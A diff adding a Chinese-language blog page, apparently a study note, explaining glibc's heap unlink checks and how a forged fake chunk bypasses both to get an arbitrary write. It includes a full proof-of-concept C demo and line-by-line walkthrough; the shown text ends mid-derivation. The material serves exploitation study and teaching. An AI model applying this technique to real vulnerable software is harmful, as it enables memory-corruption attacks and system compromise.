@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>unlink原理解析 | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="unlink原理解析 写在前面
+这里会从源码和demo的角度来分析unlink的原理和利用方式，具体的ctf例题请移步：#todo：例题连接
+源码分析 分析之前，还是放一个chunk的结构图：
+接下来是unlink时的源码(version == 2.38)：
+//比较当前chunk的size和下一个chunk的pre_size是否一致if (chunksize (p) != prev_size (next_chunk (p)))	malloc_printerr (&#34;corrupted size vs. prev_size&#34;);//将当前chunk的fd指针和bk指针单独拿出来mchunkptr fd = p-&gt;fd;mchunkptr bk = p-&gt;bk;//判断上个chunk的bk指针是否指向当前chunk，和下一个chunk的fd指针是否指向当前chunkif (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))	malloc_printerr (&#34;corrupted double-linked list&#34;);//将当前chunk脱链fd-&gt;bk = bk;	bk-&gt;fd = fd; 可以看到源码中有两个if，源码干的事我愿称之为：证 明 我 是 我 自 己！
+第一个if通过比较chunk的size和下一个chunk的pre_size来确定chunk的大小是否正确 第二个if通过双向链表中上一个的下一个chunk指向当前chunk，和下一个的上一个chunk指向当前chunk，来证明当前chunk是当前chunk 两个if检查过后，就可以脱链了：让上一个chunk的bk指针指向下一个chunk，并让下一个chunk的fd指针指向上一个chunk。
+下面这张图是CTF Wiki中对脱链的解释：
+绕过检查 通过上面的两个if检查，我们知道了unlink时，检查的正常流程。
+接下来我们会通过一个来自于heap-exploitation的demo，来演示如何绕过这两个检查，并且说明绕过之后会发生什么：
+#include &lt;unistd.h&gt;#include &lt;stdlib.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/study/unlink%E5%8E%9F%E7%90%86/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="unlink原理解析" />
+<meta property="og:description" content="unlink原理解析 写在前面
+这里会从源码和demo的角度来分析unlink的原理和利用方式，具体的ctf例题请移步：#todo：例题连接
+源码分析 分析之前，还是放一个chunk的结构图：
+接下来是unlink时的源码(version == 2.38)：
+//比较当前chunk的size和下一个chunk的pre_size是否一致if (chunksize (p) != prev_size (next_chunk (p)))	malloc_printerr (&#34;corrupted size vs. prev_size&#34;);//将当前chunk的fd指针和bk指针单独拿出来mchunkptr fd = p-&gt;fd;mchunkptr bk = p-&gt;bk;//判断上个chunk的bk指针是否指向当前chunk，和下一个chunk的fd指针是否指向当前chunkif (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))	malloc_printerr (&#34;corrupted double-linked list&#34;);//将当前chunk脱链fd-&gt;bk = bk;	bk-&gt;fd = fd; 可以看到源码中有两个if，源码干的事我愿称之为：证 明 我 是 我 自 己！
+第一个if通过比较chunk的size和下一个chunk的pre_size来确定chunk的大小是否正确 第二个if通过双向链表中上一个的下一个chunk指向当前chunk，和下一个的上一个chunk指向当前chunk，来证明当前chunk是当前chunk 两个if检查过后，就可以脱链了：让上一个chunk的bk指针指向下一个chunk，并让下一个chunk的fd指针指向上一个chunk。
+下面这张图是CTF Wiki中对脱链的解释：
+绕过检查 通过上面的两个if检查，我们知道了unlink时，检查的正常流程。
+接下来我们会通过一个来自于heap-exploitation的demo，来演示如何绕过这两个检查，并且说明绕过之后会发生什么：
+#include &lt;unistd.h&gt;#include &lt;stdlib." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/study/unlink%E5%8E%9F%E7%90%86/" /><meta property="article:section" content="study" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="unlink原理解析"/>
+<meta name="twitter:description" content="unlink原理解析 写在前面
+这里会从源码和demo的角度来分析unlink的原理和利用方式，具体的ctf例题请移步：#todo：例题连接
+源码分析 分析之前，还是放一个chunk的结构图：
+接下来是unlink时的源码(version == 2.38)：
+//比较当前chunk的size和下一个chunk的pre_size是否一致if (chunksize (p) != prev_size (next_chunk (p)))	malloc_printerr (&#34;corrupted size vs. prev_size&#34;);//将当前chunk的fd指针和bk指针单独拿出来mchunkptr fd = p-&gt;fd;mchunkptr bk = p-&gt;bk;//判断上个chunk的bk指针是否指向当前chunk，和下一个chunk的fd指针是否指向当前chunkif (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))	malloc_printerr (&#34;corrupted double-linked list&#34;);//将当前chunk脱链fd-&gt;bk = bk;	bk-&gt;fd = fd; 可以看到源码中有两个if，源码干的事我愿称之为：证 明 我 是 我 自 己！
+第一个if通过比较chunk的size和下一个chunk的pre_size来确定chunk的大小是否正确 第二个if通过双向链表中上一个的下一个chunk指向当前chunk，和下一个的上一个chunk指向当前chunk，来证明当前chunk是当前chunk 两个if检查过后，就可以脱链了：让上一个chunk的bk指针指向下一个chunk，并让下一个chunk的fd指针指向上一个chunk。
+下面这张图是CTF Wiki中对脱链的解释：
+绕过检查 通过上面的两个if检查，我们知道了unlink时，检查的正常流程。
+接下来我们会通过一个来自于heap-exploitation的demo，来演示如何绕过这两个检查，并且说明绕过之后会发生什么：
+#include &lt;unistd.h&gt;#include &lt;stdlib."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "study",
+      "item": "https://jellyfish-pro.github.io/study/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "unlink原理解析",
+      "item": "https://jellyfish-pro.github.io/study/unlink%E5%8E%9F%E7%90%86/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "unlink原理解析",
+  "name": "unlink原理解析",
+  "description": "unlink原理解析 写在前面\n这里会从源码和demo的角度来分析unlink的原理和利用方式，具体的ctf例题请移步：#todo：例题连接\n源码分析 分析之前，还是放一个chunk的结构图：\n接下来是unlink时的源码(version == 2.38)：\n//比较当前chunk的size和下一个chunk的pre_size是否一致\rif (chunksize (p) != prev_size (next_chunk (p)))\tmalloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;);\r//将当前chunk的fd指针和bk指针单独拿出来\rmchunkptr fd = p-\u0026gt;fd;\rmchunkptr bk = p-\u0026gt;bk;\r//判断上个chunk的bk指针是否指向当前chunk，和下一个chunk的fd指针是否指向当前chunk\rif (__builtin_expect (fd-\u0026gt;bk != p || bk-\u0026gt;fd != p, 0))\tmalloc_printerr (\u0026#34;corrupted double-linked list\u0026#34;);\r//将当前chunk脱链\rfd-\u0026gt;bk = bk;\tbk-\u0026gt;fd = fd; 可以看到源码中有两个if，源码干的事我愿称之为：证 明 我 是 我 自 己！\n第一个if通过比较chunk的size和下一个chunk的pre_size来确定chunk的大小是否正确 第二个if通过双向链表中上一个的下一个chunk指向当前chunk，和下一个的上一个chunk指向当前chunk，来证明当前chunk是当前chunk 两个if检查过后，就可以脱链了：让上一个chunk的bk指针指向下一个chunk，并让下一个chunk的fd指针指向上一个chunk。\n下面这张图是CTF Wiki中对脱链的解释：\n绕过检查 通过上面的两个if检查，我们知道了unlink时，检查的正常流程。\n接下来我们会通过一个来自于heap-exploitation的demo，来演示如何绕过这两个检查，并且说明绕过之后会发生什么：\n#include \u0026lt;unistd.h\u0026gt;\r#include \u0026lt;stdlib.",
+  "keywords": [
+    
+  ],
+  "articleBody": "unlink原理解析 写在前面\n这里会从源码和demo的角度来分析unlink的原理和利用方式，具体的ctf例题请移步：#todo：例题连接\n源码分析 分析之前，还是放一个chunk的结构图：\n接下来是unlink时的源码(version == 2.38)：\n//比较当前chunk的size和下一个chunk的pre_size是否一致\rif (chunksize (p) != prev_size (next_chunk (p)))\tmalloc_printerr (\"corrupted size vs. prev_size\");\r//将当前chunk的fd指针和bk指针单独拿出来\rmchunkptr fd = p-\u003efd;\rmchunkptr bk = p-\u003ebk;\r//判断上个chunk的bk指针是否指向当前chunk，和下一个chunk的fd指针是否指向当前chunk\rif (__builtin_expect (fd-\u003ebk != p || bk-\u003efd != p, 0))\tmalloc_printerr (\"corrupted double-linked list\");\r//将当前chunk脱链\rfd-\u003ebk = bk;\tbk-\u003efd = fd; 可以看到源码中有两个if，源码干的事我愿称之为：证 明 我 是 我 自 己！\n第一个if通过比较chunk的size和下一个chunk的pre_size来确定chunk的大小是否正确 第二个if通过双向链表中上一个的下一个chunk指向当前chunk，和下一个的上一个chunk指向当前chunk，来证明当前chunk是当前chunk 两个if检查过后，就可以脱链了：让上一个chunk的bk指针指向下一个chunk，并让下一个chunk的fd指针指向上一个chunk。\n下面这张图是CTF Wiki中对脱链的解释：\n绕过检查 通过上面的两个if检查，我们知道了unlink时，检查的正常流程。\n接下来我们会通过一个来自于heap-exploitation的demo，来演示如何绕过这两个检查，并且说明绕过之后会发生什么：\n#include #include #include #include struct chunk_structure {\rsize_t prev_size;\rsize_t size;\rstruct chunk_structure *fd;\rstruct chunk_structure *bk;\rchar buf[10]; // padding\r};\rint main() {\runsigned long long *chunk1, *chunk2;\rstruct chunk_structure *fake_chunk, *chunk2_hdr;\rchar data[20];\r// 首先创建连个chunk，注意不要创建可以进入fastbin的chunk\rchunk1 = malloc(0x80);\rchunk2 = malloc(0x80);\rprintf(\"%p\\n\", \u0026chunk1);\rprintf(\"%p\\n\", chunk1);\rprintf(\"%p\\n\", chunk2);\r// 假设我们可以控制chunk1的userdata部分\r// 并且通过其他的方式可以控制chunk2的`pre_size`和`size`\r//在chunk1中构建一个虚假的已释放的chunk。\r//确保通过第二个检查\rfake_chunk = (struct chunk_structure *)chunk1;\rfake_chunk-\u003efd = (struct chunk_structure *)(\u0026chunk1 - 3); // 确保 P-\u003efd-\u003ebk == P\rfake_chunk-\u003ebk = (struct chunk_structure *)(\u0026chunk1 - 2); // 确保 P-\u003ebk-\u003efd == P\r// 模拟攻击者通过特殊手段修改chunk2的`pre_size`和`size`\rchunk2_hdr = (struct chunk_structure *)(chunk2 - 2);\rchunk2_hdr-\u003eprev_size = 0x80; // 这里计算的是fake_chunk的大小\rchunk2_hdr-\u003esize \u0026= ~1; // 让p标志位置零\r// 这时只要free掉chunk2，因为chunk2的p标志位置零，就会触发chunk2向上合并，导致fake_chunk执行unlink\r// unlink后，chunk1就会指向`chunk1 - 3`的位置\r// 也就意味着，我们修改chunk1，就可以修改到`chunk1 - 3`指向的地址\rfree(chunk2);\rprintf(\"%p\\n\", chunk1);\rprintf(\"%p\\n\", chunk1[3]);\r//将字符串\"Victim's data\"放入chunk1[3]处。\rchunk1[3] = (unsigned long long)data;\rstrcpy(data, \"Victim's data\");\r// 通过修改chunk1[0]，来修改chunk1[3]处的值\rchunk1[0] = 0x002164656b636168LL;\rprintf(\"%s\\n\", data);\rreturn 0;\r} 绕过第二个检测 fake_chunk = (struct chunk_structure *)chunk1;\rfake_chunk-\u003efd = (struct chunk_structure *)(\u0026chunk1 - 3); // 确保 P-\u003efd-\u003ebk == P\rfake_chunk-\u003ebk = (struct chunk_structure *)(\u0026chunk1 - 2); // 确保 P-\u003ebk-\u003efd == P 首先是将chunk1的user_data指针给fake_chunk 并把fake_chunk伪造成一个已经被释放的chunk 这时chunk1的结构如下：\n这里需要注意为什么要把fake_chunk_fd设置成\u0026chunk1 - 3（fake_chunk_bk同理），这里我们先看一下第二个检查的源码：\nif (__builtin_expect (fd-\u003ebk != p || bk-\u003efd != p, 0))\tmalloc_printerr (\"corrupted double-linked list\"); 可以看到检查会检查上一个chunk的bk是不是自己和下一个chunk的fd是不是自己\n这里fake_chunk_fd的值为\u0026chunk1 - 3，系统会将这个值指向的地址当作上一个chunk，同时去寻找这个chunk的bk的值，也就是\u0026chunk1 - 3 + 3的位置，所以最后就又变成了chunk1，这样就绕过了第二个检测。\n绕过第一个检测 相比之下，绕过第一个检测就显得不是那么复杂，我们只需要将chunk2的pre_size改为fake_chunk的大小，将chunk2的p标志位改为0。就可以了：\nchunk2_hdr = (struct chunk_structure *)(chunk2 - 2);\rchunk2_hdr-\u003eprev_size = 0x80; // 这里计算的是fake_chunk的大小\rchunk2_hdr-\u003esize \u0026= ~1; // 让p标志位置零 因为chunk1申请了0x80个大小，所以chunk1的真实大小为0x90，减去pre_size和size，就只有0x80大小了。\n最终的效果 当我们构造了一段可绕过两个检查的虚假内存后，这时的内存结构如下：\n这时我们如果free掉chunk2，因为chunk2的P标志位被改成0，所以系统会往上进行合并，这时就会将我们构造的fake_chunk当作真正的chunk，进行unlink操作，和chunk2进行合并。\n而unlink操作会出现什么问题，我们结合源码一起来分析：\n//将当前chunk的fd指针和bk指针单独拿出来\rmchunkptr fd = p-\u003efd;\rmchunkptr bk = p-\u003ebk;\r//将当前chunk脱链\rfd-\u003ebk = bk;\tbk-\u003efd = fd; **注意：**为了连贯性，我将两个if检查删去了。\n通过源码我们可以看到，首先会将fake_chunk的fd和bk保存到单独的变量中，此时的fd和bk变量如下：\nfd = \u0026chunk1 - 3\rbk = \u0026chunk1 - 2 随后将将fd和bk指向的地址当作chunk，来寻找fd-\u003ebk和bk-\u003efd。\n这时对于fd-\u003ebk = bk;就有如下的推定：\n因为 fd-\u003ebk = bk;\r而 fd-\u003ebk = \u0026chunk1 - 3 +3; bk = \u0026chunk1 - 2;\r所以有 \u0026chunk1 - 3 +3 = \u0026chunk1 - 2;\r最后为 \u0026chunk1 = \u0026chunk1 - 2; 同理，bk-\u003efd = fd;就变成了如下模样：\n因为 bk-\u003efd = fd;\r所以有 \u0026chunk1 = - 2 + 2 = \u0026chunk1 - 3;\r最后变成 \u0026chunk1 = \u0026chunk1 - 3; 因为都是对\u0026chunk1进行操作，所以最后\u0026chunk1指向\u0026chunk1 - 3。\n这样，原本存放chunk1地址的栈空间，就指向了（原本存放chunk1地址的栈空间 - 0x18）的栈空间。\n这时候我们打印chunk1的地址，其实得到的是chunk1 - 3的地址。\n**注意：**这个地方虽然变量名称叫做chunk1，但实际上存放的不是chunk1的地址了，而是原本存放chunk1地址的栈空间减去0x18的位置（\u0026chunk1 - 3）。\nprintf(\"%p\\n\", chunk1);\rprintf(\"%p\\n\", chunk1[3]); 所以当我们对chunk1[0]进行修改时，就可以直接修改到chunk1[3]。注意：这里的chunk1已经不是我们之前malloc返回的的chunk1了\n//将字符串\"Victim's data\"放入chunk1[3]处。\rchunk1[3] = (unsigned long long)data;\rstrcpy(data, \"Victim's data\");\r// 通过修改chunk1[0]，来修改chunk1[3]指向的值\rchunk1[0] = 0x002164656b636168LL;\rprintf(\"%s\\n\", data); 最终输出是hacked!而非Victim's data。\n",
+  "wordCount" : "415",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/study/unlink%E5%8E%9F%E7%90%86/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/study" title="study">
+                    <span>study</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/study/">study</a></div>
+    <h1 class="post-title">
+      unlink原理解析
+    </h1>
+    <div class="post-meta">2 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#unlink%e5%8e%9f%e7%90%86%e8%a7%a3%e6%9e%90" aria-label="unlink原理解析">unlink原理解析</a><ul>
+                        
+                <li>
+                    <a href="#%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90" aria-label="源码分析">源码分析</a></li>
+                <li>
+                    <a href="#%e7%bb%95%e8%bf%87%e6%a3%80%e6%9f%a5" aria-label="绕过检查">绕过检查</a><ul>
+                        
+                <li>
+                    <a href="#%e7%bb%95%e8%bf%87%e7%ac%ac%e4%ba%8c%e4%b8%aa%e6%a3%80%e6%b5%8b" aria-label="绕过第二个检测">绕过第二个检测</a></li>
+                <li>
+                    <a href="#%e7%bb%95%e8%bf%87%e7%ac%ac%e4%b8%80%e4%b8%aa%e6%a3%80%e6%b5%8b" aria-label="绕过第一个检测">绕过第一个检测</a></li>
+                <li>
+                    <a href="#%e6%9c%80%e7%bb%88%e7%9a%84%e6%95%88%e6%9e%9c" aria-label="最终的效果">最终的效果</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="unlink原理解析">unlink原理解析<a hidden class="anchor" aria-hidden="true" href="#unlink原理解析">#</a></h2>
+<p>写在前面</p>
+<p>这里会从源码和demo的角度来分析unlink的原理和利用方式，具体的ctf例题请移步：#todo：例题连接</p>
+<h3 id="源码分析">源码分析<a hidden class="anchor" aria-hidden="true" href="#源码分析">#</a></h3>
+<p>分析之前，还是放一个chunk的结构图：</p>
+<p><img loading="lazy" src="/study/unlink.assets/image-20231113105142129.png" alt="image-20231113105142129"  />
+</p>
+<p>接下来是unlink时的源码(version == 2.38)：</p>
+<pre tabindex="0"><code>//比较当前chunk的size和下一个chunk的pre_size是否一致
+if (chunksize (p) != prev_size (next_chunk (p)))		
+	malloc_printerr (&#34;corrupted size vs. prev_size&#34;);
+  
+
+//将当前chunk的fd指针和bk指针单独拿出来
+mchunkptr fd = p-&gt;fd;
+mchunkptr bk = p-&gt;bk;
+
+//判断上个chunk的bk指针是否指向当前chunk，和下一个chunk的fd指针是否指向当前chunk
+if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))	
+	malloc_printerr (&#34;corrupted double-linked list&#34;);
+
+//将当前chunk脱链
+fd-&gt;bk = bk;											
+bk-&gt;fd = fd;
+</code></pre><p>可以看到源码中有两个if，源码干的事我愿称之为：<strong>证 明 我 是 我 自 己！</strong></p>
+<ul>
+<li>第一个if通过比较chunk的size和下一个chunk的pre_size来确定chunk的大小是否正确</li>
+<li>第二个if通过双向链表中上一个的下一个chunk指向当前chunk，和下一个的上一个chunk指向当前chunk，来证明当前chunk是当前chunk</li>
+</ul>
+<p>两个if检查过后，就可以脱链了：<strong>让上一个chunk的bk指针指向下一个chunk，并让下一个chunk的fd指针指向上一个chunk。</strong></p>
+<p>下面这张图是<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">CTF Wiki</a>中对脱链的解释：</p>
+<p><img loading="lazy" src="/study/unlink.assets/image-20231113110446082.png" alt="image-20231113110446082"  />
+</p>
+<h3 id="绕过检查">绕过检查<a hidden class="anchor" aria-hidden="true" href="#绕过检查">#</a></h3>
+<p>通过上面的两个if检查，我们知道了unlink时，检查的正常流程。</p>
+<p>接下来我们会通过一个来自于<a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">heap-exploitation</a>的demo，来演示如何绕过这两个检查，并且说明绕过之后会发生什么：</p>
+<pre tabindex="0"><code>#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+struct chunk_structure {
+  size_t prev_size;
+  size_t size;
+  struct chunk_structure *fd;
+  struct chunk_structure *bk;
+  char buf[10];               // padding
+};
+
+int main() {
+  unsigned long long *chunk1, *chunk2;
+  struct chunk_structure *fake_chunk, *chunk2_hdr;
+  char data[20];
+
+  // 首先创建连个chunk，注意不要创建可以进入fastbin的chunk
+  chunk1 = malloc(0x80);
+  chunk2 = malloc(0x80);
+  printf(&#34;%p\n&#34;, &amp;chunk1);
+  printf(&#34;%p\n&#34;, chunk1);
+  printf(&#34;%p\n&#34;, chunk2);
+
+  // 假设我们可以控制chunk1的userdata部分
+  // 并且通过其他的方式可以控制chunk2的`pre_size`和`size`
+
+  //在chunk1中构建一个虚假的已释放的chunk。
+  //确保通过第二个检查
+  fake_chunk = (struct chunk_structure *)chunk1;
+  fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // 确保 P-&gt;fd-&gt;bk == P
+  fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // 确保 P-&gt;bk-&gt;fd == P
+
+  // 模拟攻击者通过特殊手段修改chunk2的`pre_size`和`size`
+  chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
+  chunk2_hdr-&gt;prev_size = 0x80;  // 这里计算的是fake_chunk的大小
+  chunk2_hdr-&gt;size &amp;= ~1;        // 让p标志位置零
+
+  // 这时只要free掉chunk2，因为chunk2的p标志位置零，就会触发chunk2向上合并，导致fake_chunk执行unlink
+  // unlink后，chunk1就会指向`chunk1 - 3`的位置
+  // 也就意味着，我们修改chunk1，就可以修改到`chunk1 - 3`指向的地址
+  free(chunk2);
+  printf(&#34;%p\n&#34;, chunk1);
+  printf(&#34;%p\n&#34;, chunk1[3]);
+  
+  
+  //将字符串&#34;Victim&#39;s data&#34;放入chunk1[3]处。
+  chunk1[3] = (unsigned long long)data;
+  strcpy(data, &#34;Victim&#39;s data&#34;);
+
+  // 通过修改chunk1[0]，来修改chunk1[3]处的值
+  chunk1[0] = 0x002164656b636168LL;
+
+  printf(&#34;%s\n&#34;, data);
+
+  return 0;
+}
+</code></pre><h4 id="绕过第二个检测">绕过第二个检测<a hidden class="anchor" aria-hidden="true" href="#绕过第二个检测">#</a></h4>
+<pre tabindex="0"><code>fake_chunk = (struct chunk_structure *)chunk1;
+fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // 确保 P-&gt;fd-&gt;bk == P
+fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // 确保 P-&gt;bk-&gt;fd == P
+</code></pre><ul>
+<li>首先是将chunk1的user_data指针给fake_chunk</li>
+<li>并把fake_chunk伪造成一个已经被释放的chunk</li>
+</ul>
+<p>这时chunk1的结构如下：</p>
+<p><img loading="lazy" src="/study/unlink.assets/image-20231114172119879.png" alt="image-20231114172119879"  />
+</p>
+<p>这里需要注意为什么要把fake_chunk_fd设置成<code>&amp;chunk1 - 3</code>（fake_chunk_bk同理），这里我们先看一下第二个检查的源码：</p>
+<pre tabindex="0"><code>if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))	
+	malloc_printerr (&#34;corrupted double-linked list&#34;);
+</code></pre><p>可以看到检查会检查上一个chunk的bk是不是自己和下一个chunk的fd是不是自己</p>
+<p>这里fake_chunk_fd的值为<code>&amp;chunk1 - 3</code>，系统会将这个值指向的地址当作上一个chunk，同时去寻找这个chunk的bk的值，也就是<code>&amp;chunk1 - 3 + 3</code>的位置，所以最后就又变成了chunk1，这样就绕过了第二个检测。</p>
+<h4 id="绕过第一个检测">绕过第一个检测<a hidden class="anchor" aria-hidden="true" href="#绕过第一个检测">#</a></h4>
+<p>相比之下，绕过第一个检测就显得不是那么复杂，我们只需要将chunk2的<code>pre_size</code>改为fake_chunk的大小，将chunk2的p标志位改为0。就可以了：</p>
+<pre tabindex="0"><code>chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
+chunk2_hdr-&gt;prev_size = 0x80;  // 这里计算的是fake_chunk的大小
+chunk2_hdr-&gt;size &amp;= ~1;        // 让p标志位置零
+</code></pre><p>因为chunk1申请了0x80个大小，所以chunk1的真实大小为0x90，减去<code>pre_size</code>和<code>size</code>，就只有0x80大小了。</p>
+<h4 id="最终的效果">最终的效果<a hidden class="anchor" aria-hidden="true" href="#最终的效果">#</a></h4>
+<p>当我们构造了一段可绕过两个检查的虚假内存后，这时的内存结构如下：</p>
+<p><img loading="lazy" src="/study/unlink.assets/image-20231115140259236.png" alt="image-20231115140259236"  />
+</p>
+<p>这时我们如果free掉chunk2，因为chunk2的P标志位被改成0，所以系统会往上进行合并，这时就会将我们构造的fake_chunk当作真正的chunk，进行unlink操作，和chunk2进行合并。</p>
+<p>而unlink操作会出现什么问题，我们结合源码一起来分析：</p>
+<pre tabindex="0"><code>//将当前chunk的fd指针和bk指针单独拿出来
+mchunkptr fd = p-&gt;fd;
+mchunkptr bk = p-&gt;bk;
+
+
+//将当前chunk脱链
+fd-&gt;bk = bk;											
+bk-&gt;fd = fd;
+</code></pre><p>**注意：**为了连贯性，我将两个if检查删去了。</p>
+<p>通过源码我们可以看到，首先会将fake_chunk的fd和bk保存到单独的变量中，此时的fd和bk变量如下：</p>
+<pre tabindex="0"><code>fd = &amp;chunk1 - 3
+bk = &amp;chunk1 - 2
+</code></pre><p>随后将将fd和bk指向的地址当作chunk，来寻找fd-&gt;bk和bk-&gt;fd。</p>
+<p>这时对于<code>fd-&gt;bk = bk;</code>就有如下的推定：</p>
+<pre tabindex="0"><code>因为 fd-&gt;bk = bk;
+而 fd-&gt;bk = &amp;chunk1 - 3 +3; bk = &amp;chunk1 - 2;
+所以有 &amp;chunk1 - 3 +3 = &amp;chunk1 - 2;
+最后为 &amp;chunk1 = &amp;chunk1 - 2;
